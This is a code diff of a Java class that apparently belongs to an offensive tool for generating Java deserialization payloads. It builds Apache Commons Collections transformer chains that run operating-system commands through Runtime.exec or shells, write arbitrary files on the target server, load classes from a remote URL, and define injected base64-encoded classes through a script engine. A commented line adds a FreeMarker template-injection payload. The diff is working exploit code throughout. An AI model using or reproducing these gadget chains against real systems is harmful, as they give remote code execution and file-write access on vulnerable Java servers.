@@ -6,6 +6,8 @@ import com.ppp.Printer;
 import com.ppp.sinks.annotation.EnchantEnums;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
+import com.ppp.utils.CommandUtils;
+import com.ppp.utils.FileUtils;
 import com.ppp.utils.maker.CryptoUtils;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -33,9 +35,9 @@ public class InvokerTransformer3 {
      */
     @EnchantType({EnchantType.Command, EnchantType.DEFAULT})
     public Transformer[] runtime(SinksHelper sinksHelper) {
-        String command = sinksHelper.getCommand();
+        Object command = sinksHelper.getCommand();
         EnchantEnums commandType = sinksHelper.getCommandType();
-        EnchantEnums os = sinksHelper.getOs();
+        boolean split = sinksHelper.isSplit();
         String code = sinksHelper.getCode();
         String codeFile = sinksHelper.getCodeFile();
 
@@ -46,6 +48,11 @@ public class InvokerTransformer3 {
         switch (commandType) {
             default:
             case Runtime:
+                Class execArgClass = String.class;
+                if (split) {
+                    execArgClass = String[].class;
+                    command = CommandUtils.splitCommand((String) command);
+                }
                 transformers = new Transformer[]{
                         new ConstantTransformer(Runtime.class),
                         new InvokerTransformer("getMethod", new Class[]{
@@ -55,53 +62,81 @@ public class InvokerTransformer3 {
                                 Object.class, Object[].class}, new Object[]{
                                 null, new Object[0]}),
                         new InvokerTransformer("exec",
-                                new Class[]{String.class}, new Object[]{command}),
+                                new Class[]{execArgClass}, new Object[]{command}),
                         new ConstantTransformer(1)};
                 break;
 
-            case ProcessBuilder:
-                if (os != null && os.equals(EnchantEnums.WIN)) {
-                    Printer.yellowInfo("os: " + os);
-                    transformers = new Transformer[]{
-                            new ConstantTransformer(ProcessBuilder.class),
-                            new InvokerTransformer("getDeclaredConstructor", new Class[]{
-                                    Class[].class}, new Object[]{new Class[]{String[].class}}),
-                            new InvokerTransformer("newInstance", new Class[]{
-                                    Object[].class}, new Object[]{new Object[]{new String[]{"cmd.exe", "/c", command}}}),
-                            new InvokerTransformer("start", new Class[]{}, new Object[]{}),
-                            new ConstantTransformer(1)};
-                } else {
-                    transformers = new Transformer[]{
-                            new ConstantTransformer(ProcessBuilder.class),
-                            new InvokerTransformer("getDeclaredConstructor", new Class[]{
-                                    Class[].class}, new Object[]{new Class[]{String[].class}}),
-                            new InvokerTransformer("newInstance", new Class[]{
-                                    Object[].class}, new Object[]{new Object[]{new String[]{"/bin/sh", "-c", command}}}),
-                            new InvokerTransformer("start", new Class[]{}, new Object[]{}),
-                            new ConstantTransformer(1)};
-                }
-                break;
+//            case ProcessBuilder:
+//                if (os != null && os.equals(EnchantEnums.WIN)) {
+//                    Printer.yellowInfo("os: " + os);
+//                    transformers = new Transformer[]{
+//                            new ConstantTransformer(ProcessBuilder.class),
+//                            new InvokerTransformer("getDeclaredConstructor", new Class[]{
+//                                    Class[].class}, new Object[]{new Class[]{String[].class}}),
+//                            new InvokerTransformer("newInstance", new Class[]{
+//                                    Object[].class}, new Object[]{new Object[]{new String[]{"cmd.exe", "/c", command}}}),
+//                            new InvokerTransformer("start", new Class[]{}, new Object[]{}),
+//                            new ConstantTransformer(1)};
+//                } else {
+//                    transformers = new Transformer[]{
+//                            new ConstantTransformer(ProcessBuilder.class),
+//                            new InvokerTransformer("getDeclaredConstructor", new Class[]{
+//                                    Class[].class}, new Object[]{new Class[]{String[].class}}),
+//                            new InvokerTransformer("newInstance", new Class[]{
+//                                    Object[].class}, new Object[]{new Object[]{new String[]{"/bin/sh", "-c", command}}}),
+//                            new InvokerTransformer("start", new Class[]{}, new Object[]{}),
+//                            new ConstantTransformer(1)};
+//                }
+//                break;
 
             case ScriptEngine:
+//                if (codeFile != null) {
+//                    try {
+//                        FileInputStream fileInputStream = new FileInputStream(codeFile);
+//                        byte[] codeBytes = new byte[fileInputStream.available()];
+//                        fileInputStream.read(codeBytes);
+//                        fileInputStream.close();
+//                        code = new String(codeBytes);
+//                    } catch (Exception e) {
+//                        Printer.error("File read error");
+//                    }
+//                }
+//                if (code == null) {
+//                    code = String.format("java.lang.Runtime.getRuntime().exec(\"%s\")", command);
+//
+//                    if (commandSplit) {
+//                        command = CommandUtils.splitCommandComma((String) command);
+//                        code = String.format("var x=new java.lang.ProcessBuilder;" +
+//                                "x.command(%s);" +
+//                                "x.start();", command);
+//                    }
+////                    Printer.blueInfo("use default code template: " + code);
+//                }
+//                // 模板替换 -cmd -> [ppp]
+//                code = code.replaceAll("\\[ppp\\]", (String) command);
+//
+//                Printer.blueInfo(String.format("js code is: %s", code));
+
                 if (codeFile != null) {
                     try {
+
                         FileInputStream fileInputStream = new FileInputStream(codeFile);
                         byte[] codeBytes = new byte[fileInputStream.available()];
                         fileInputStream.read(codeBytes);
                         fileInputStream.close();
                         code = new String(codeBytes);
                     } catch (Exception e) {
-                        Printer.error("File read error");
+                        Printer.warn("File read error");
+                    }
+                } else if (code == null) {
+                    if (split) {
+                        code = String.format("x=new java.lang.ProcessBuilder;x.command(%s);x.start();", CommandUtils.splitCommandComma((String) command));
+                    } else {
+                        code = String.format("java.lang.Runtime.getRuntime().exec('%s');", command);
                     }
                 }
-                if (code == null) {
-                    code = String.format("java.lang.Runtime.getRuntime().exec(\"%s\")", command);
-                    Printer.blueInfo("use default code template: " + code);
-                }
-                // 模板替换 -cmd -> [ppp]
-                code = code.replaceAll("\\[ppp\\]", command);
 
-                Printer.yellowInfo(String.format("js code is: %s", code));
+                Printer.yellowInfo("code: " + code);
 
                 transformers = new Transformer[]{
                         new ConstantTransformer(ScriptEngineManager.class),
@@ -193,32 +228,60 @@ public class InvokerTransformer3 {
         String serverFilePath = sinksHelper.getServerFilePath();
         String localFilePath = sinksHelper.getLocalFilePath();
         String fileContent = sinksHelper.getFileContent();
+        byte[] fileBytes = sinksHelper.getFileBytes();
+        boolean split = sinksHelper.isSplit();
+        boolean append = sinksHelper.isAppend();
+
+
         Printer.yellowInfo("Server file path: " + serverFilePath);
 
         byte[] contentBytes = new byte[]{};
 
-        if (localFilePath != null) {
-            Printer.yellowInfo("Local file path: " + localFilePath);
-            try {
-                FileInputStream fileInputStream = new FileInputStream(localFilePath);
-                contentBytes = new byte[fileInputStream.available()];
-                fileInputStream.read(contentBytes);
-                fileInputStream.close();
-            } catch (Exception e) {
-                Printer.error("File read error");
+        if (fileBytes != null) {
+            contentBytes = fileBytes;
+        } else {
+            if (localFilePath != null) {
+                Printer.yellowInfo("Local file path: " + localFilePath);
+                try {
+                    contentBytes = FileUtils.fileRead(localFilePath);
+                    Printer.warn(String.format("File content length: %s, if too large, please use -split option", contentBytes.length));
+                    if (split) {
+                        int partSize = sinksHelper.getPartSize();
+                        Printer.blueInfo("File will be split into " + partSize + "kb parts");
+                        sinksHelper.setFileParts(FileUtils.splitFile(localFilePath, partSize));
+                        sinksHelper.setLoop(true);
+                    }
+                } catch (Exception e) {
+                    Printer.error("File read error");
+                }
+            } else if (fileContent != null) {
+                Printer.yellowInfo("File content: " + fileContent);
+                contentBytes = fileContent.getBytes();
             }
-        } else if (fileContent != null) {
-            contentBytes = fileContent.getBytes();
         }
 
-        return new Transformer[]{
-                new ConstantTransformer(FileOutputStream.class),
-                new InstantiateTransformer(
-                        new Class[]{String.class},
-                        new Object[]{serverFilePath}
-                ),
-                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{contentBytes}),
-                new ConstantTransformer(1)};
+
+        if (append) {
+            Printer.blueInfo("bytes will be written to the end of the file");
+            return new Transformer[]{
+                    new ConstantTransformer(FileOutputStream.class),
+                    new InstantiateTransformer(
+                            new Class[]{String.class, boolean.class},
+                            new Object[]{serverFilePath, true}
+                    ),
+                    new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{contentBytes}),
+                    new ConstantTransformer(1)};
+        } else {
+            return new Transformer[]{
+                    new ConstantTransformer(FileOutputStream.class),
+                    new InstantiateTransformer(
+                            new Class[]{String.class},
+                            new Object[]{serverFilePath}
+                    ),
+                    new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{contentBytes}),
+                    new ConstantTransformer(1)};
+        }
+
     }
 
     /**
@@ -231,11 +294,11 @@ public class InvokerTransformer3 {
     @EnchantType({EnchantType.RemoteLoad})
     public Transformer[] remoteLoad(SinksHelper sinksHelper) throws Exception {
         String url = sinksHelper.getUrl();
-        String remoteClassName = sinksHelper.getRemoteClassName();
+        String className = sinksHelper.getClassName();
         Object constructor = sinksHelper.getConstructor();
 
         Printer.yellowInfo("Remote url: " + url);
-        Printer.yellowInfo("Remote class name: " + remoteClassName);
+        Printer.yellowInfo("Remote class name: " + className);
 
         Transformer[] transformers;
 
@@ -257,7 +320,7 @@ public class InvokerTransformer3 {
                             new Class[]{URL[].class},
                             new Object[]{new URL[]{new URL(url)}}
                     ),
-                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{remoteClassName}),
+                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}),
                     new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{constructorType}}),
                     new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{args}}),
                     new ConstantTransformer(1)};
@@ -269,7 +332,7 @@ public class InvokerTransformer3 {
                             new Class[]{URL[].class},
                             new Object[]{new URL[]{new URL(url)}}
                     ),
-                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{remoteClassName}),
+                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}),
                     new InstantiateTransformer(null, null),
                     new ConstantTransformer(1)};
         }
@@ -283,8 +346,8 @@ public class InvokerTransformer3 {
      * @param sinksHelper
      * @return
      */
-    @EnchantType({EnchantType.LocalLoad})
-    public Transformer[] localLoad(SinksHelper sinksHelper) throws Exception {
+    @EnchantType({EnchantType.JavaClass})
+    public Transformer[] JavaClass(SinksHelper sinksHelper) throws Exception {
         EnchantEnums loadFunction = sinksHelper.getLoadFunction();
 
         /**
@@ -298,7 +361,7 @@ public class InvokerTransformer3 {
         if (javaClassHelper != null) {
             classBytes = JavaClassBuilder.build(javaClassHelper);
             className = javaClassHelper.getCLASSNAME();
-            System.out.println("Class Name: " + className);
+//            System.out.println("Class Name: " + className);
         }
 
         if (classBytes == null) {
@@ -330,15 +393,35 @@ public class InvokerTransformer3 {
              */
             String b64 = CryptoUtils.base64encoder(classBytes);
 
-            String code = "var data=\"" + b64 + "\";\n" +
-                    "var aClass = java.lang.Class.forName(\"sun.misc.BASE64Decoder\");\n" +
-                    "var object = aClass.newInstance();\n" +
-                    "var bytes = aClass.getMethod(\"decodeBuffer\", java.lang.String.class).invoke(object, data);\n" +
-                    "var classLoader=new java.lang.ClassLoader() {};\n" +
-                    "var defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
-                    "defineClassMethod.setAccessible(true);\n" +
-                    "var loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);\n" +
-                    "loadedClass.newInstance();";
+//            String code = "data=\"" + b64 + "\";\n" +
+//                    "aClass = java.lang.Class.forName(\"sun.misc.BASE64Decoder\");\n" +
+//                    "object = aClass.newInstance();\n" +
+//                    "bytes = aClass.getMethod(\"decodeBuffer\", java.lang.String.class).invoke(object, data);\n" +
+//                    "classLoader=new java.lang.ClassLoader() {};\n" +
+//                    "defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", \"\".getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
+//                    "defineClassMethod.setAccessible(true);\n" +
+//                    "loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);\n" +
+//                    "loadedClass.newInstance();";
+
+            String code = String.format("data=\"%s\";bytes=\"\".getBytes();" +
+                    "try{bytes=java.util.Base64.getDecoder().decode(data);}catch(e){" +
+                    "aClass=java.lang.Class.forName(\"sun.misc.BASE64Decoder\");" +
+                    "object=aClass.newInstance();" +
+                    "bytes=aClass.getMethod(\"decodeBuffer\",java.lang.String.class).invoke(object,data);}" +
+                    "classLoader=java.lang.Thread.currentThread().getContextClassLoader();" +
+                    "try{" +
+                    "clazz=classLoader.loadClass(\"%s\");" +
+                    "clazz.newInstance();" +
+                    "}catch(err){" +
+                    "defineClassMethod=java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\",\"\".getBytes().getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);" +
+                    "defineClassMethod.setAccessible(true);" +
+                    "loadedClass=defineClassMethod.invoke(classLoader,bytes,0,bytes.length);" +
+                    "loadedClass.newInstance();" +
+                    "};", b64, className);
+
+
+//            String codec = code.replaceAll("\"", "\\\\\"");
+//            System.out.printf("{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval('%s#{1};')}\",\"dbSource\":\"\",\"type\":\"0\"}%n", codec);
 
             transformers = new Transformer[]{
                     new ConstantTransformer(ScriptEngineManager.class),
